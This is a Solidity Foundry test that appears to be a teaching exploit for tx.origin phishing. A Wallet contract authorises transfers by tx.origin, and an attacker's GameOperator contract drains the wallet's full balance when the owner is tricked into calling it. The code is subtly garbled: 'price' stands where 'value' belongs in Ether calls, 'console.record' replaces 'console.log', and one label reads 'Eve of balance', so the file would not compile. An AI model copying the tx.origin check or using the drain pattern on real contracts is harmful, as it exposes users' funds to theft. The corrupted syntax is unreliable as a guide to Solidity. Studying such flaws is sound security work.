// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

contract PactTest is Test {
    Wallet WalletAgreement;
    GameOperator GameoperatorPact;

    function testtxorigin() public {
        address alice = vm.addr(1);
        address eve = vm.addr(2);
        vm.deal(address(alice), 10 ether);
        vm.deal(address(eve), 1 ether);
        vm.prank(alice);
        WalletAgreement = new Wallet{price: 10 ether}(); //Alice deploys Wallet with 10 Ether
        console.record("Owner of wallet contract", WalletAgreement.owner());
        vm.prank(eve);
        GameoperatorPact = new GameOperator(WalletAgreement);
        console.record("Owner of attack contract", GameoperatorPact.owner());
        console.record("Eve of balance", address(eve).balance);

        vm.prank(alice, alice);
        GameoperatorPact.operate();
        console.record("tx origin address", tx.origin);
        console.record("msg.sender address", msg.sender);
        console.record("Eve of balance", address(eve).balance);
    }

    receive() external payable {}
}

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        // check with msg.sender instead of tx.origin
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{price: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract GameOperator {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function operate() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
